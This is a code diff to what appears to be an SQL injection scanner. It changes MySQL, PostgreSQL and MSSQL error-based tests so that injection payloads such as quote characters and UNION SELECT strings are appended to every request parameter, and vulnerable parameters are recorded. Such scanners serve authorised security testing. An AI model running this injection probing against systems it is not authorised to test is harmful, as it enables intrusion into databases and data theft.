@@ -119,6 +119,9 @@ class ErrorBasedInjector:
         """Test for MySQL error-based SQL injection."""
         results = []
         
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
+        
         # Common MySQL error-based payloads
         payloads = [
             "'",
@@ -142,29 +145,35 @@ class ErrorBasedInjector:
             "' UNION ALL SELECT 1,2,3 #"
         ]
         
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_mysql_error(response):
-                    results.append({
-                        "type": "mysql_error_based",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "error": self._extract_mysql_error(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing MySQL error-based injection: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_mysql_error(response):
+                        results.append({
+                            "type": "error",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "error": self._extract_mysql_error(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing MySQL error-based injection: {str(e)}")
+                    continue
+                    
         return results
         
     def _test_postgres_error(self) -> List[Dict[str, Any]]:
         """Test for PostgreSQL error-based SQL injection."""
         results = []
+        
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
         
         # Common PostgreSQL error-based payloads
         payloads = [
@@ -189,29 +198,35 @@ class ErrorBasedInjector:
             "' UNION ALL SELECT 1,2,3 #"
         ]
         
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_postgres_error(response):
-                    results.append({
-                        "type": "postgres_error_based",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "error": self._extract_postgres_error(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing PostgreSQL error-based injection: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_postgres_error(response):
+                        results.append({
+                            "type": "error",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "error": self._extract_postgres_error(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing PostgreSQL error-based injection: {str(e)}")
+                    continue
+                    
         return results
         
     def _test_mssql_error(self) -> List[Dict[str, Any]]:
         """Test for MSSQL error-based SQL injection."""
         results = []
+        
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
         
         # Common MSSQL error-based payloads
         payloads = [
@@ -236,24 +251,27 @@ class ErrorBasedInjector:
             "' UNION ALL SELECT 1,2,3 #"
         ]
         
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_mssql_error(response):
-                    results.append({
-                        "type": "mssql_error_based",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "error": self._extract_mssql_error(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing MSSQL error-based injection: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_mssql_error(response):
+                        results.append({
+                            "type": "error",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "error": self._extract_mssql_error(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing MSSQL error-based injection: {str(e)}")
+                    continue
+                    
         return results
         
     def _check_mysql_error(self, response) -> bool:
